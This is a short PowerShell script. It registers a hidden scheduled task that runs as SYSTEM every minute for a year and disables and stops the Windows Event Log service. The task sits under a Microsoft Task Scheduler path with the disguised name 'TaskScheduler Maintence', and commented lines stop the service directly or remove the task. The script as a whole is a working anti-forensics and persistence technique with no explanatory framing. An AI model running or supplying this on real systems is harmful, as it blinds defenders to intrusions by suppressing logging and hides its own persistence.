$command = "set-service -name Eventlog -startuptype Disabled; stop-service -name Eventlog -force"

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $command

$principal = New-ScheduledTaskPrincipal -UserId 'System'  # -LogonType ServiceAccount

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 365)

$settings = New-ScheduledTaskSettingsSet -Hidden

$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

Register-ScheduledTask -TaskPath "\Microsoft\Windows\Taskscheduler" -TaskName "TaskScheduler Maintence" -InputObject $task

start-ScheduledTask -TaskPath "\Microsoft\Windows\Taskscheduler" -TaskName "TaskScheduler Maintence" 

# Get-Service EventLog | stop-service -Force

# Unregister-ScheduledTask -TaskName "Taskscheduler Maintanence" -Confirm:$false
# Get-ScheduledTask -TaskName "Eventlog Maintanence"